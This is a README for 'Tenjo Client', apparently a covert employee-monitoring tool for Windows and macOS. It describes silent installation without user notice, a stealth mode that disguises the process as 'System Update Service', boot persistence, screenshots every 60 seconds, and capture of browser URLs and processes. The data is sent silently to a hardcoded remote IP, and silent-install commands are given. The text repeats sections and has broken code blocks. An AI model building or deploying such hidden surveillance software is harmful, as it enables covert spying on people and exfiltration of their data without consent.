# Tenjo Client - Employee Monitoring System

## Overview
Silent employee monitoring system that runs in background without user notification.

## 🚀 **Quick Start**

### Windows
1. **Download** client files or clone repository
2. **Navigate** to client directory
3. **Run** `simple_start_windows.bat`

### macOS
1. **Download** client files or clone repository
2. **Navigate** to client directory  
3. **Run** `./simple_start_macos.sh`

## 📦 **What the Scripts Do**

The startup scripts will automatically:
- ✅ Check Python 3 installation
- ✅ Install required dependencies (requests, mss, psutil, pillow)
- ✅ Display current configuration
- ✅ Start the monitoring client

## 📋 **Manual Installation**

If you prefer manual setup:
./easy_install_macos.sh
```
3. **Enter** your dashboard server URL
4. **Wait** for installation to complete

## Features
- ✅ **Silent Installation** - No user prompts or notifications during operation
- ✅ **Advanced Service Management** - Built-in startup script with signal handling
- ✅ **Auto-Start** - Automatically starts on system boot via LaunchAgent/Service
- ✅ **Stealth Mode** - Runs hidden in background as "System Update Service"
- ✅ **Cross-Platform** - Works on Windows and macOS
- ✅ **Self-Contained** - Installs dependencies automatically
- ✅ **Easy Uninstall** - Simple removal scripts included
- ✅ **Graceful Shutdown** - Proper cleanup on system signals

## Monitoring Features
- 📸 **Screenshot capture** every 60 seconds
- 🌐 **Browser activity** monitoring (URLs, titles, time spent)
- 💻 **Process monitoring** (running applications)
- 📊 **URL tracking** with duration
- 📡 **Silent data transmission** to dashboard server
- 🔧 **Enhanced logging** with rotating log files

## 🗑️ **Stopping the Client**

Simply press `Ctrl+C` in the terminal where the client is running, or close the terminal window.

For permanent removal:
- **Windows**: Delete the client folder
- **macOS**: Delete the client folder

## Technical Details

### Configuration
- **Client ID**: Automatically generated based on hardware fingerprint
- **Server**: http://103.129.149.67 (configurable in `src/core/config.py`)
- **Screenshot Interval**: 60 seconds (configurable)
- **Dependencies**: requests, mss, psutil, pillow

### Process Information
- **Service Name**: "Tenjo Client"
- **Network**: Communicates with dashboard server
- **Storage**: Screenshots and logs stored locally
- **Cross-Platform**: Works on Windows and macOS

## Server Configuration

### Default Server
- **URL**: `http://103.129.149.67`
- **Protocol**: HTTP/HTTPS supported
- **Port**: Configurable during installation

### Custom Server Installation
**Windows:**
```cmd
easy_install_windows.bat
### Custom Server Configuration
Edit `src/core/config.py` to change:
- Server URL
- Screenshot interval  
- Other settings

## Advanced Service Management

The client includes a comprehensive startup script (`tenjo_startup.py`) with enhanced features:

### **Manual Service Control**
```bash
# Start service manually
python3 tenjo_startup.py

# Start with custom server
python3 tenjo_startup.py --server-url http://your-server.com

# Install as system service
python3 tenjo_startup.py --install-service

# Uninstall system service  
python3 tenjo_startup.py --uninstall-service

# Debug mode (visible, detailed logs)
python3 tenjo_startup.py --no-stealth --debug
```

### **Service Features**
- ✅ **Signal Handling** - Graceful shutdown on SIGINT/SIGTERM
- ✅ **Rotating Logs** - Automatic log rotation by date
- ✅ **Service Installation** - Cross-platform service management
- ✅ **Stealth Mode** - Configurable visibility
- ✅ **Error Recovery** - Automatic restart on failures

See `STARTUP_SCRIPT_DOCS.md` for complete documentation.

## Server Configuration

### Default Server
- **URL**: `http://103.129.149.67`
- **Protocol**: HTTP/HTTPS supported
- **Port**: Configurable during installation

### Custom Server Installation
**Windows:**
```cmd
easy_install_windows.bat
# Enter custom URL when prompted: http://103.129.149.67
```

**macOS:**
```bash
./easy_install_macos.sh
# Enter custom URL when prompted: http://103.129.149.67
```

## Advanced Installation (Stealth Mode)

For completely silent installation without user interaction:

### Windows Silent Install
```cmd
install_windows.bat http://103.129.149.67
```

### macOS Silent Install
```bash
./install_macos.sh http://103.129.149.67
```

## Troubleshooting

### Check Service Status
```bash
# Check if Tenjo is running
ps aux | grep tenjo_startup

# View real-time logs
tail -f ~/.tenjo_client/src/logs/tenjo_startup_$(date +%Y%m%d).log

# Check service registration (macOS)
launchctl list | grep tenjo
```

### Common Issues
1. **"Access Denied"** - Run as Administrator (Windows) or with sudo (macOS)
2. **"Python not found"** - Script will auto-install Python
3. **"Network error"** - Check server URL and network connection
4. **"Service not starting"** - Check firewall and antivirus settings

### Manual Removal
If uninstall scripts don't work:

**Windows:**
```cmd
schtasks /delete /tn "system_update_service" /f
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdate" /f
rmdir /s /q "%APPDATA%\SystemUpdate"
```

**macOS:**
```bash
launchctl unload ~/Library/LaunchAgents/com.tenjo.client.plist
rm ~/Library/LaunchAgents/com.tenjo.client.plist
rm -rf ~/.tenjo_client
```

## Support
- Monitoring runs completely in background
- No visible interface or notifications
- Enhanced logging for troubleshooting
- Automatic restart if process crashes
- Logs are minimized for stealth operation
